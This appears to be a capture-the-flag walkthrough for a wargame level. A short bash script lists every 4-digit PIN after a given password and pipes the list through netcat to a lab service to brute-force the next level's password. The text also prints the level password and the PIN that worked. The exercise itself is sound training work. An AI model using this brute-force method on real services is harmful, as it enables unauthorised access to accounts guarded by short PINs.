This cmd shows all processes running on your machine.
Here we can see that there is a 'nc' process with 30002 port number

cmdit: nc 10.0.1.228 30002
We are asked to put bandit24 password and a 4 digit pin following a space.
e., gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000

Since we are trying brute-force method, lets make a script which will save us some time.

Lets make a script which will make a file which stores the password, space, and all 4 digit numbers.
And we will pipe this file to 'nc' command to get the password for next bandit.

cmdit: mkdir /tmp/ssspam
cmdit: cd /tmp/ssspam
cmdit: nano script.sh
In this script, write the below lines and save it.
#!/bin/bash
for i in $(seq -w 0000 9999); do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> list.txt
done

cmdit: chmod +x script.sh
cmdit: ./script.sh
cmdit: ls -l
cmdit: cat list.txt | nc 10.0.1.228 30002
This will give you password for next bandit

(I got the password for number - 2219, it might be same or different for you guys, so try the all steps)
